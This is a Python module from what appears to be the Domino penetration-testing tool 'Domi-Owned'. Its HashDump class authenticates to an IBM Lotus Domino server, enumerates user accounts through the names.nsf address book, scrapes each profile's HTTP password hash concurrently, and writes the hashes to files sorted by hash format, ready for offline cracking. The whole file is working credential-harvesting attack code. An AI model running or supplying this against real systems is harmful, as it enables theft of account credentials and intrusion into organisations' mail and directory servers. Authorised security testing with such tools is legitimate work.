# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import aiohttp
import asyncio
import re
import sys

from bs4 import BeautifulSoup


class HashDump(object):
	"""Enumerate Domino accounts and dump account hashes"""

	def __init__(self, domiowned, username, password):
		self.domiowned = domiowned
		self.username = username
		self.password = password

		self.accounts = []

	# Get user profile URLs
	def enum_accounts(self):
		account_regex = re.compile(r'/([a-f0-9]{32}/[a-f0-9]{32})', re.I)

		for page in range(1, sys.maxsize**10, 1000):
			endpoint = "names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={0}&Count=1000".format(page)
			response = self.domiowned.authenticate(self.username, self.password, endpoint)
			if response.status_code == 200:
				soup = BeautifulSoup(response.text, 'lxml')

				# Break if page not found
				if 'No documents found' in str(soup.findAll('h2')):
					break
				else:
					links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
					for link in links:
						if account_regex.search(link):
							account = "{0}/names.nsf/{1}?OpenDocument".format(self.domiowned.url, account_regex.search(link).group(1))
							if account in self.accounts:
								pass
							else:
								self.accounts.append(account)
			else:
				self.accounts = None
				break

		return self.accounts

	def hashdump(self):
		sem = asyncio.Semaphore(40)
		loop = asyncio.get_event_loop()
		f = asyncio.wait([self._send_requests(account, sem) for account in self.accounts])
		loop.run_until_complete(f)

	@asyncio.coroutine
	def _send_requests(self, account, sem):
		with (yield from sem):
			if self.domiowned.auth_type == 'basic':
				response = yield from aiohttp.request(
					'GET',
					account,
					headers=self.domiowned.HEADERS,
					auth=aiohttp.BasicAuth(self.username, self.password),
					compress=True
				)
			elif self.domiowned.auth_type == 'form':
				response = yield from aiohttp.request(
					'GET',
					account,
					headers=self.domiowned.HEADERS,
					cookies=dict(DomAuthSessId=self.domiowned.session.cookies['DomAuthSessId']),
					compress=True
				)
			else:
				response = yield from aiohttp.request(
					'GET',
					account,
					headers=self.domiowned.HEADERS,
					compress=True
				)

			if response.status == 200:
				data = yield from response.text()
				self._parse_hash(data)

			yield from response.release()

	@asyncio.coroutine
	def _get(self, *args, **kwargs):
		response = yield from aiohttp.request('GET', *args, **kwargs)
		if response.status == 200:
			return (yield from response.text())

		yield from response.release()

	def _parse_hash(self, data):
		keywords = (
			['$dspFullName', '$dspShortName'],
			['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
		)

		soup = BeautifulSoup(data, 'lxml')

		# Get account username
		for user_param in keywords[0]:
			domino_username = soup.find('input', attrs={'name': user_param})['value']
			if domino_username:
				break

		# Get account hash
		for hash_param in keywords[1]:
			domino_hash = soup.find('input', attrs={'name': hash_param})['value']
			if domino_hash:
				break

		if domino_username and domino_hash:
			print("{0}:{1}".format(domino_username, domino_hash))
			self._write_hash(domino_username, domino_hash)

	# Sort and write hashes to file
	def _write_hash(self, dusername, dhash):
		hash_length = len(dhash)

		# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
		if hash_length == 34:
			dhash = dhash.strip('()')
			out_file = 'domino_5_hashes.txt'

		# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
		elif hash_length == 22:
			out_file = 'domino_6_hashes.txt'

		# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
		else:
			out_file = 'domino_8_hashes.txt'

		# Write to file
		f = open(out_file, 'a')
		f.write("{0}:{1}\n".format(dusername, dhash))
